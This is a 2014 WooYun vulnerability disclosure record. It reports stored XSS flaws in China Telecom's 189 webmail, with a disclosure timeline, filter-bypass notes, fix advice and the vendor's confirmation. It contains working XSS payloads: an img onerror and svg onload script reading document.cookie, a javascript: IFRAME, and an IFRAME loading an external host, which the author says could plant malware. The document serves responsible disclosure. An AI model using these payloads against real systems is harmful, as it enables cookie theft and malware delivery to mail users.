{"id": 2957, "wybug_id": "wooyun-2014-062029", "wybug_title": "中国电信189邮箱多处存储型XSS漏洞", "wybug_corp": "中国电信", "wybug_author": "nextdoor", "wybug_date": "2014-05-28 18:22", "wybug_open_date": "2014-07-12 18:22", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["持久型", "存储型"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-28：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-01：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-11：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-06-21：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-07-01：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-07-12：\t细节向公众公开  简要描述： 中国电信189邮箱多处存储型XSS漏洞 详细说明：  中国电信189邮箱多处存储型的跨站漏洞描述：电信189邮箱在过滤on事件(仅仅在标签中才过滤，不在标签的不过滤),还有javascript,data和expssion等标签，很难绕过，很头疼。A.先来一个mxss漏洞这样原因是在正文中过滤了，在标题中未过滤，且标题的过滤可以被轻松绕过利用代码\n&lt;img src=1 onerror=alert(888) &gt;&lt;svg  onload=\"alert(document.cookie)\"></svg&gt;aaaaaa&lt;i onmouseover=alert(1)&gt;aaaa\n如图所示\n\n打开邮件漏洞直接触发\n\n其他标签就可使用<div><i>和<svg>这个i标签必须回复转发下且鼠标在数字上触发，\n\n\n\nsvg下自动触发\n\nb.这个漏洞是在签名处，由于在插入链接时可以闭合<a>标签，从而插入<iframe>标签利用代码\n<IFRAME SRC=\"javascript:alert(27);\"></IFRAME>\n测试过程\n\n漏洞回复，转发时触发\n\n代码代码执行\n\nc.正文和快速回复处它们未过滤iframe这个危险的标签。且iframe只有进入一个外部的html文件就可以了，这个还可以挂马，危害很大利用代码\n<IFRAME SRC=\"http://182.124.1.1:8088/2.html\"></IFRAME>\n\n\n漏洞回复转发触发\n\n代码执行\n\n快速回复中可以插入iframe，测试有效，不在贴图证明总结：过滤时要完全啊。盗取cookie的过程就是把执行的代码换成我们的js代码，不在详述。   漏洞证明：  漏洞证明\n\n   修复方案：  漏洞防御：1.对于xmss漏洞，正文中怎样过滤，标题中也怎样过滤2.对签名处，正文处怎样过滤，签名处怎样过滤3.正文和回复中，对iframe标签过滤   版权声明：转载请注明来源 nextdoor@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2014-06-01 23:28 厂商回复： CNVD确认并复现所述情况，转由CNCERT协调中国电信集团公司通报处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}